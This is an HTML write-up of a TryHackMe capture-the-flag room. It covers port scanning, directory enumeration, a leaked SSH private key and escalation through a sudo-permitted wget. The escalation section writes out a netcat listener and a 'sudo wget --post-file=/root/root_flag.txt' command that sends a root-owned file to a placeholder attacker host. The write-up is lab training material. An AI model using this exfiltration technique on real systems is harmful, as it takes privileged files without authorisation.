<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>WGE LCTF | TryHackMe Writeup</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      background-color: #0d0d0d;
      color: #b9fbc0;
      font-family: 'Courier New', monospace;
      padding: 2em;
      max-width: 900px;
      margin: auto;
    }
    h1, h2 {
      color: #00f5d4;
    }
    h3 {
      color: #ff4ecd;
    }
    a {
      color: #85f4ff;
      text-decoration: none;
    }
    a:hover {
      text-decoration: underline;
    }
    img {
      width: 100%;
      border: 2px solid #333;
      border-radius: 8px;
      margin: 1.5em 0;
    }
    code {
      background-color: #1a1a1a;
      padding: 2px 6px;
      border-radius: 4px;
      color: #00ff88;
    }
    pre {
      background-color: #111;
      padding: 12px;
      overflow-x: auto;
      border-left: 4px solid #00d9ff;
      border-radius: 6px;
    }
    .section {
      margin-bottom: 3em;
    }
  </style>
</head>
<body>

  <h1>ğŸš© TryHackMe â€“ WGE LCTF Writeup</h1>
  <p><strong>Room:</strong> <a href="https://tryhackme.com/room/wgelctf" target="_blank">WGE LCTF</a></p>

  <div class="section">
    <h2>ğŸ” Initial Recon</h2>
    <p>Nmap scan on <code>10.10.141.118</code>:</p>
    <img src="assets/img/wgel/scan.png" alt="Nmap scan">
    <ul>
      <li>22/tcp â€“ SSH</li>
      <li>80/tcp â€“ HTTP (Apache 2.4.18)</li>
    </ul>
  </div>

  <div class="section">
    <h2>ğŸŒ Apache Default Page</h2>
    <p>Port 80 shows Apache default page:</p>
    <img src="assets/img/wgel/apache-server.png" alt="Apache default">
  </div>

  <div class="section">
    <h2>ğŸ“‚ Hidden Page Discovered</h2>
    <p>Manually navigating to <code>/sitemap/</code> shows an Unapp landing page:</p>
    <img src="assets/img/wgel/sitemap-found.png" alt="Unapp template">
  </div>

  <div class="section">
    <h2>ğŸ› ï¸ Gobuster Enumeration</h2>
    <p>Running Gobuster on the root path reveals a suspicious <code>.ssh</code> folder:</p>
    <img src="assets/img/wgel/gobuster-found.png" alt="Gobuster finds .ssh">

    <p>Running Gobuster directly on <code>/sitemap/</code> shows even more structure, including the same <code>.ssh</code> folder, proving the leak is inside that path:</p>
    <img src="assets/img/wgel/sitemap-gobuster.png" alt="Gobuster on /sitemap">
  </div>

  <div class="section">
    <h2>ğŸ‘€ Developer Comment</h2>
    <p>Viewing the HTML source of the landing page, we find a dev note:</p>
    <img src="assets/img/wgel/source-code.png" alt="Dev comment">
    <blockquote><em>"Jessie don't forget to update the website"</em></blockquote>
  </div>

  <div class="section">
    <h2>ğŸ”‘ SSH Key Disclosure</h2>
    <p>Inside <code>/sitemap/.ssh/</code>, a private key is fully exposed:</p>
    <img src="assets/img/wgel/ssh-found.png" alt="Private key found">
  </div>

  <div class="section">
    <h2>ğŸ” SSH Access Gained</h2>
    <p>We use the key to login as <code>jessie</code>:</p>
    <img src="assets/img/wgel/ssh-login.png" alt="SSH login successful">
  </div>

  <div class="section">
    <h2>ğŸ” Sudo Privileges Review</h2>
    <p><code>wget</code> is allowed via <code>sudo</code> with no password:</p>
    <img src="assets/img/wgel/sudo-l.png" alt="Sudo privileges">
  </div>

  <div class="section">
    <h2>ğŸ“œ user_flag.txt Captured</h2>
    <p>We find <code>user_flag.txt</code> using <code>find / -name user_flag.txt</code>:</p>
    <img src="assets/img/wgel/userflag.txt.png" alt="User flag">
  </div>

  <div class="section">
    <h2>âš¡ Manual PrivEsc via wget --post-file</h2>
    <p>GTFOBins lists <code>wget</code> for privilege escalation, but the reverse shell technique didnâ€™t work on this machine.</p>
    <p>Instead, we use <code>--post-file</code> to send <code>/root/root_flag.txt</code> to our own HTTP listener:</p>
    <img src="assets/img/wgel/wget-vuln.png" alt="wget --post-file trick">
    <pre><code># Attacker:
nc -lvnp 80

# Victim:
sudo /usr/bin/wget --post-file=/root/root_flag.txt http://YOUR-IP</code></pre>
    <p>The flag is delivered via POST!</p>
  </div>

  <div class="section">
    <h2>ğŸ root_flag.txt Captured</h2>
    <p>We capture the root flag on our listener:</p>
    <img src="assets/img/wgel/rootflag.png" alt="Root flag received">
  </div>

  <div class="section">
    <h2>âœ… Summary</h2>
    <ul>
      <li>ğŸ”“ SSH key leaked â†’ Access as <code>jessie</code></li>
      <li>ğŸ”§ Sudo allowed <code>wget</code> â†’ Exploited manually</li>
      <li>ğŸš© Captured <code>user_flag.txt</code> and <code>root_flag.txt</code></li>
    </ul>
  </div>

</body>
</html>

